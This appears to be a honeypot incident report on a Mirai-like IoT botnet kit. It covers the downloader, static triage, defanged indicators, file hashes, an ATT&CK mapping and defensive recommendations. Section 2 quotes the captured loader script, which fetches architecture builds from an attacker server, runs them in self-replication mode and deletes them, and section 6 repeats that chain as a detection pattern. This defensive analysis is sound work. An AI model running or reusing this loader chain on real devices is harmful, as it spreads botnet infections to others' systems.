# IR-2026-004: Multi-Architecture IoT Botnet Payloads Captured (`jkl*` kit)

| Field | Value |
|---|---|
| **Incident ID** | IR-2026-004 |
| **Status** | Closed: payloads captured and hashed; sensor decommissioned |
| **Severity** | Low on the honeypot (emulated shell, nothing executed). **Critical** on a real device: full bot installation with self-propagation |
| **Sensor** | `honeypot-01` (Cowrie, Telnet/SSH) |
| **Window** | 2026-10-17 → 2026-10-26 |
| **Payload servers** | `176.65.139[.]40` (primary; also an attacking source, campaign hash `6d1e0ff1`, 382 sessions) and `185.228.72[.]128` (same kit) |
| **Detection** | Final capture before decommissioning: `cowrie.session.file_download` events and static triage of Cowrie's downloads directory |

## 1. Summary

A botnet kit delivered a downloader script (`wget.sh` / `curl.sh`) from two servers. The script downloads one bot build per CPU architecture (11 architectures, files named `jkl<arch>`), runs each with the argument **`selfrep`**, and deletes the file. Unlike IR-2026-002, the payload server answered over **HTTP/80** (the one egress port open), so Cowrie saved the files: **20 ARM bot binaries**, 4 downloader scripts, and 5 x86-64 binaries of separate origin. Nothing was executed; all analysis is static (file type, size, hash, script text).

## 2. The downloader (`wget.sh`, SHA-256 `7b8cd695…c417`)

```sh
/bin/busybox wget http://176.65.139[.]40/jklarm7 -O jklarm7;   # download one architecture build
/bin/busybox chmod +x jklarm7;                                 # make it executable
./jklarm7 selfrep;                                             # run in self-replication mode
/bin/busybox rm -rf jklarm7                                    # delete the file, keep running in memory
#   … repeated for: arm, arm5, arm6, arm7, m68k, mips, mpsl, ppc, sh4, spc, x86
/bin/busybox rm -rf wget.sh                                    # delete the downloader itself
```

## 3. Analysis

**Spray-all-architectures delivery.** The script doesn't detect the CPU; it runs every build and only the matching one starts. That's simpler and more robust than IR-2026-001's `/proc/self/exe` fingerprinting, and it's why this kit succeeded against Cowrie where IR-2026-001 gave up.

**`selfrep`: the infection becomes a scanner.** The argument switches the bot into self-propagation (scanning for and infecting new devices), the mechanism behind the constant Telnet/SSH scanning seen throughout this lab. *Confidence: medium*, inferred from naming and the kit's behaviour; the binaries weren't executed or reverse-engineered.

**Run-and-delete** leaves the bot running with its executable `(deleted)`, exactly what the competitor-killer script from Campaign D (see [triage notes](notes/2026-10-16-triage.md)) searches for and kills.

**Only ARM builds were captured** (4 names: `jklarm`, `jklarm5`, `jklarm6`, `jklarm7`, ~25 downloads each), even though the script lists 11 architectures. *Likely cause (medium):* sessions ended, or Cowrie's emulation diverged, before the later lines ran.

**20 distinct hashes for 4 file names.** The same names returned different binaries over the 10-day window: the kit was **rebuilt or repacked repeatedly**. Hash-based IOCs for this family decay within days; URLs, file-name patterns and the `selfrep` behaviour are more durable detections.

**Family attribution: suspected Mirai variant** (multi-arch static builds, BusyBox loader, architecture-suffixed names, self-replication). *Confidence: medium.* **Not yet verified** against sandbox or antivirus results; check the hashes on VirusTotal or MalwareBazaar.

**x86-64 binaries (5, dynamically linked, 65 KB – 30 MB)** are a different toolkit aimed at full Linux servers, not IoT. Their delivery path wasn't attributed in this analysis (they don't appear among the top download URLs). The 30 MB file's size is consistent with a Go-compiled tool or a bundled cryptominer. *Unverified.*

**Egress control, revisited.** HTTP/80 was allowed to keep Ubuntu's package mirrors working, and that's the port this kit used. For a production IoT segment, the lesson from IR-2026-002 still holds: allow only specific destinations, not whole ports.

## 4. Indicators

**Network** (defanged)

| Indicator | Role |
|---|---|
| `176.65.139[.]40` | Payload server **and** attacking source |
| `185.228.72[.]128` | Payload server (same kit) |
| `hxxp://176.65.139[.]40/wget.sh`, `/curl.sh` | Downloader scripts |
| `hxxp://176.65.139[.]40/jkl{arm,arm5,arm6,arm7,m68k,mips,mpsl,ppc,sh4,spc,x86}` | Bot builds per architecture |
| `hxxp://185.228.72[.]128/{wget.sh,curl.sh,jklarm,jklarm6,jklarm7}` | Same kit, second server |

**Behaviour:** `./<file> selfrep` · BusyBox `wget … -O X; chmod +x X; ./X selfrep; rm -rf X` · file names `jkl<arch>`.

**Files** (SHA-256; Cowrie names each file by its hash; static triage only)

| SHA-256 | Size (B) | Type |
|---|---|---|
| `7b8cd695424f9b004b459ce886d92e9a24f38957dc9071510ab669a7cb89c417` | 1,487 | sh script (downloader) |
| `b965f772177c2e79bff3739cdffa544d357e16441bdd833428aae067fe52dd65` | 1,488 | sh script (downloader) |
| `72d835f767c8ced23530f2a80db15ebc60716d280badac96ece9185e3c89e118` | 1,499 | sh script (downloader) |
| `e06be431a8d427579fec15f84bb152326953a7be7a4d20060c6317614ca27843` | 1,498 | sh script (downloader) |
| `0747c95ff81f46e8dc3c6131c0d26e7d2d6fb29cfc0639b293de11a08c46d277` | 111,240 | ELF32 ARM EABI4, static |
| `1bb74b1018af89e5e3f68a3dd744969359bf3f4c3a6cace1598bc2f0a819f481` | 106,472 | ELF32 ARM EABI4, static |
| `499699635a36b065cad4f2b4e35968ac9bdf811f9e1725403fa90dc186f3c068` | 124,936 | ELF32 ARM EABI4, static |
| `5fb6bf10dc300cf382754d89ce4183fb63db5e33d9e2e7ae5d9de964f9ab5b28` | 121,648 | ELF32 ARM EABI4, static |
| `a2572af43c9b42eeb7a014f30f84fa9bc2561bc2722700dc41ef26e004dbfcea` | 108,148 | ELF32 ARM EABI4, static |
| `b77381dddb9c39d4380f0206435f462af7295206eb06f0d30e174aacd46b2d41` | 124,852 | ELF32 ARM EABI4, static |
| `b7e1ce9255b89d08c5e95749f72993b8b50cfff17ee17f843dee947e873c8212` | 124,968 | ELF32 ARM EABI4, static |
| `c7f02f9b77f12f9ce12f281eaa2d409237cab14881b52fe4420ef512540ea544` | 111,156 | ELF32 ARM EABI4, static |
| `e0799ea53062ccf81718d84bd6beb3e46a39cc127c166118e9d9d25432fc83b2` | 120,604 | ELF32 ARM EABI4, static |
| `f2d4898329126e280c1c0845ef4fc19ad9e822622b0c38afe4ec5c74f1228591` | 112,252 | ELF32 ARM EABI4, static |
| `01bbf841bc97e59fb87ac7a74f02d80ac65d16741b3fd690dccdfd508cde6aa4` | 100,996 | ELF32 ARM (OABI), static |
| `053b39be4792a7d8b395fb1432c5ce4ee0da069eff08f848b6ebfa7e355a4730` | 104,468 | ELF32 ARM (OABI), static |
| `19b07137c61e9a8bb83d0b408bdc5b2f58c89fb54a9cdf1fd7b0b81ce9ebafe4` | 104,388 | ELF32 ARM (OABI), static |
| `2c5a2712809bb5c5f14bb82fdd1f8853532617df599733da87fb3fb4a51fcd4b` | 108,160 | ELF32 ARM (OABI), static |
| `2e3f62a338df37103065d6a832d6a97be2b30b9b3d975bc0134c72c156900a2f` | 105,092 | ELF32 ARM (OABI), static |
| `51f80a1865c1dec8568925971f4ecd8f8f4348c855259ebc55b4de3c52c8699a` | 96,884 | ELF32 ARM (OABI), static |
| `5c4bf78d795182f218d9ba696fe9a8bdba23f61df2b3b1cbc44116094ed9593f` | 100,044 | ELF32 ARM (OABI), static |
| `8182fdf5fffca2a35ea0c59210fe6e47c6eb670a794bad8f10e0c33d9896741c` | 108,156 | ELF32 ARM (OABI), static |
| `a47a7015e8a147b38d1b1a8805abfeba72ce5dc7730fe997eff8b59eff663338` | 108,160 | ELF32 ARM (OABI), static |
| `e6faa9b088f4bf2425faebe05b1fce1e3ec3178ebf4d889b655d087a913dd4c9` | 108,160 | ELF32 ARM (OABI), static |
| `02ba9b3ee805baa59b6d9a2a5ae689040565877b5c996bfe4002c95cbfdcc13e` | 2,424,832 | ELF64 x86-64, dynamic (separate toolkit) |
| `6e08a9b19df98e36da4409a8ae5990bde3ed6dc583fbea9f112cbc55421aec59` | 1,146,880 | ELF64 x86-64, dynamic (separate toolkit) |
| `94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00` | 30,304,472 | ELF64 x86-64, dynamic (separate toolkit) |
| `d7f98e379c400c13340781ccb65017c000330824ea26680866b9d3e43d641721` | 65,536 | ELF64 x86-64, dynamic (separate toolkit) |
| `e948036f1c3b3024a6864fa1c49332c80e1fd28484cf487233a50154ffe104f8` | 131,072 | ELF64 x86-64, dynamic (separate toolkit) |

The samples themselves were **not** retained or shared; they were destroyed with the sensor's disk.

## 5. MITRE ATT&CK

| Tactic | Technique | Evidence |
|---|---|---|
| Initial Access | T1133 External Remote Services · T1078.001 Default Accounts | Telnet/SSH logins with default credentials |
| Command and Control | **T1105 Ingress Tool Transfer** | `wget`/`curl` of `wget.sh` and `jkl*` builds (successful) |
| Execution | T1059.004 Unix Shell | `sh wget.sh`, `./jkl<arch> selfrep` |
| Defense Evasion | T1222.002 Linux File Permissions Modification | `chmod +x` |
| Defense Evasion | T1070.004 Indicator Removal: File Deletion | `rm -rf jkl<arch>`, `rm -rf wget.sh` |
| Lateral Movement / propagation | *(no exact technique; closest T1210 / worm behaviour)* | `selfrep` self-replication mode |

## 6. Recommended actions (real network)

1. Block and alert on `176.65.139[.]40` and `185.228.72[.]128`; alert on any internal host fetching `wget.sh`/`curl.sh` or `jkl*` paths.
2. Detect on **behaviour**, not just hashes (20 hashes for 4 names in 10 days): `wget|curl … -O X; chmod +x X; ./X selfrep; rm -rf X`, and executables running with a `(deleted)` binary.
3. Destination-based egress allowlists for IoT segments (port-based allow on 80 was enough for this kit).
4. Submit the hashes to MalwareBazaar/VirusTotal for family confirmation.
